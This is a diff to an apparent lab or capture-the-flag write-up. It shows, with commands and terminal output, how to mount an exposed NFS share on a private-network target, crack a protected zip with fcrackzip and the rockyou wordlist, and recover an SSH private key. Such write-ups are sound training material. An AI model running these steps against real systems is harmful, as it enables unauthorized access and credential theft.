@@ -122,4 +122,74 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 4. Go to the directory `cd /mnt/dev`
 5. list the directory `ls`
 6. unzip the file `unzip save.zip`
-7. However it has password, we need to install fcrackzip
+7. However it has password, we need to install fcrackzip `apt install fcrackzip`
+8. Use fcrackzip to crack the password using the wordlist dictionary rockyou.txt
+```
+fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt save.zip
+```
+where:
+
+- -v - verbosity
+- -u - unzip
+- -D - dictionary
+- -p - we are using wordlistfile rockyou.txt
+- save.zip - the file that we will unzip
+
+```
+┌──(root㉿kali)-[~]
+└─# showmount -e 192.168.64.6
+Export list for 192.168.64.6:
+/srv/nfs 172.16.0.0/12,10.0.0.0/8,192.168.0.0/16
+
+┌──(root㉿kali)-[~]
+└─# mkdir /mnt/dev 
+
+┌──(root㉿kali)-[~]
+└─# mount -t nfs 192.168.64.6:/srv/nfs /mnt/dev
+
+┌──(root㉿kali)-[~]
+└─# cd /mnt/dev 
+
+┌──(root㉿kali)-[/mnt/dev]
+└─# ls
+save.zip
+
+┌──(root㉿kali)-[/mnt/dev]
+└─# unzip save.zip
+Archive:  save.zip
+[save.zip] id_rsa password: 
+password incorrect--reenter: 
+   skipping: id_rsa                  incorrect password
+   skipping: todo.txt                incorrect password
+
+┌──(root㉿kali)-[/mnt/dev]
+└─# apt install fcrackzip
+
+┌──(root㉿kali)-[/mnt/dev]
+└─# fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt save.zip                                                                          
+found file 'id_rsa', (size cp/uc   1435/  1876, flags 9, chk 2a0d)
+found file 'todo.txt', (size cp/uc    138/   164, flags 9, chk 2aa1)
+
+
+PASSWORD FOUND!!!!: pw == java101
+
+┌──(root㉿kali)-[/mnt/dev]
+└─# unzip save.zip 
+Archive:  save.zip
+[save.zip] id_rsa password: 
+  inflating: id_rsa                  
+  inflating: todo.txt                
+
+┌──(root㉿kali)-[/mnt/dev]
+└─# ls
+id_rsa  save.zip  todo.txt
+
+┌──(root㉿kali)-[/mnt/dev]
+└─# cat todo.txt 
+- Figure out how to install the main website properly, the config file seems correct...
+- Update development website
+- Keep coding in Java because it's awesome
+
+jp
+
+```
